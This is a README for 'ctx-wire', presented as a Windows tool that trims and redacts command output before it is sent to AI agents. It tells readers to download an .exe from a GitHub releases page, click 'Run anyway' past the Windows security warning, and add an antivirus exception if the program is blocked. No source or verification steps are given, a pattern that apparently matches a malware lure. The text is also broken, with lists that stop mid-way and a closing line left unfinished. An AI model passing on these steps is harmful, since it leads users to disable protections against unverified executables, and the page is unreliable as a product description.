# ⚡ ctx-wire - Send clear data to your AI

[![](https://img.shields.io/badge/Download-ctx--wire-blue.svg)](https://github.com/fantastic-interpolation620/ctx-wire)

ctx-wire helps you work with AI agents. These smart assistants often struggle when you feed them logs or code outputs that are too large. This tool solves that problem. It runs your commands, removes unimportant information, protects your secrets, and provides a short summary for your AI. You keep the full details on your own hard drive. This saves money on AI tokens and keeps your work flow fast.

## 📥 How to download the software

You need to download the program to your computer. Follow these steps:

1. Visit the [official download page](https://github.com/fantastic-interpolation620/ctx-wire).
2. Look for the "Releases" section on the right side of the page.
3. Click on the latest version link.
4. Locate the file ending in `.exe` for Windows.
5. Click the file to start the download.

## ⚙️ Setting up your system

The software runs on Windows 10 or Windows 11. Make sure your computer has an internet connection. You do not need to install complex software paths or change system settings.

After the download finishes, find the file in your "Downloads" folder. Double-click the file to open the program. If Windows shows a security box, click "More info" and then "Run anyway." This confirms you trust the software.

## 🛠️ How to use the program

Once the program opens, you see a simple window. This window is your interface for sending commands to your AI.

1. Type the command you want to run in the top box. For example, if you want to see the files in your folder, type `dir`.
2. Select your filter profile. A filter profile tells the software what to hide and what to save. Use the "Default" profile to start. This profile scrubs common secrets like passwords and keys from the output.
3. Press the "Run" button.
4. The software carries out your command. It clears out the clutter and presents a short summary in the window.

## 🛡️ Protecting your data

Privacy matters. The software looks for sensitive patterns in your command output. These patterns include API keys, email addresses, and passwords. It replaces these items with placeholders before the data leaves your computer. Your secrets never reach the AI.

The software also keeps a record of the full output on your computer. This file hides in a local folder called `.ctx-wire`. If the AI report looks incomplete or if something goes wrong, you can open this file to see everything that happened.

## 💡 Using filters

Filters shape your output. You can edit the filter rules to exclude specific types of code or logs. If you work on a project that produces many warnings, you can create a rule that ignores those lines. This keeps your AI responses focused on the work that matters.

To add a filter:

1. Open the "Settings" menu.
2. Select "Filter Manager."
3. Click "New Filter."
4. Type the text you want the tool to ignore or compress.
5. Save the changes.

This approach works for many tasks. Use it for:

* Debugging code errors.

## 📋 Frequently asked questions

**Where does my data go?**
Your data stays on your computer. Only the cleaned, shortened summary goes to the AI service you choose.

**Does it change my files?**
No. The software only reads the output of the commands you run. It does not delete or change your project files.

**Can I use it with any AI?**
Yes. You can copy the short output and paste it into any chat window. 

**What happens if I forget a command?**
The interface saves your history. Click the "History" tab to see everything you ran earlier today.

**Is it safe to clear the local logs?**
Yes. You can delete the `.ctx-wire` folder to free up space. Do this if you no longer need the full logs from your previous sessions.

## 🔧 Troubleshooting

If the program does not start, check if your antivirus software blocked it. Sometimes, Windows marks new software as a risk. You can set an exception in your antivirus menu to allow the software to run.

If the output looks strange, check your filter settings. Sometimes a filter rule is too broad. Delete or edit the rule in the "Filter Manager" to fix this.

If the program freezes, close the window and try again. The software handles command errors safely, so your system remains stable.

## 📁 Staying organized

The software creates one folder for each project. You can name these folders to match your work. When you start the software, it asks which project you want to use. This keeps your logs separate and easy to find later.

Use these labels to organize your work:
